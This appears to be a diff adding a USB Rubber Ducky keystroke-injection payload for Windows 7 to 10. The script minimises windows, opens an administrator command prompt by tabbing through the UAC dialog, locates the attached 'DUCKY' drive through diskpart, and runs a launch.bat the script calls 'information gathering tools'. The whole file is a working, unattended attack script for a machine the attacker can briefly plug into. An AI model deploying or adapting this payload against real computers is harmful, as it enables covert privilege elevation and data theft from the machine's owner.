@@ -1,0 +1,34 @@
+DEFAULT_DELAY 25
+REM Target: WINDOWS 10, WINDOWS 8(.1) and WINDOWS 7
+REM Author: Erwin Bierens
+REM URL: https://erwinbierens.com
+DELAY 1000
+REM --> Minimize all windows
+WINDOWS d
+DELAY 500
+ESCAPE
+CONTROL ESCAPE
+DELAY 100
+REM Run CMD as Administrator
+STRING cmd
+DELAY 400
+CTRL-SHIFT ENTER
+DELAY 400
+TAB
+DELAY 400
+TAB
+DELAY 400
+TAB
+DELAY 400
+ENTER
+DELAY 400
+STRING for /f "tokens=3 delims= " %A in ('echo list volume ^| diskpart ^| findstr "DUCKY"') do (set DUCKYdrive=%A:)
+ENTER
+DELAY 200
+STRING set DUCKYdrive=%DUCKYdrive%\MrGraysRubberHacks
+ENTER
+DELAY 200
+REM Launch bat file for al information gathering tools
+STRING %DUCKYdrive%\launch.bat
+ENTER
+DELAY 200
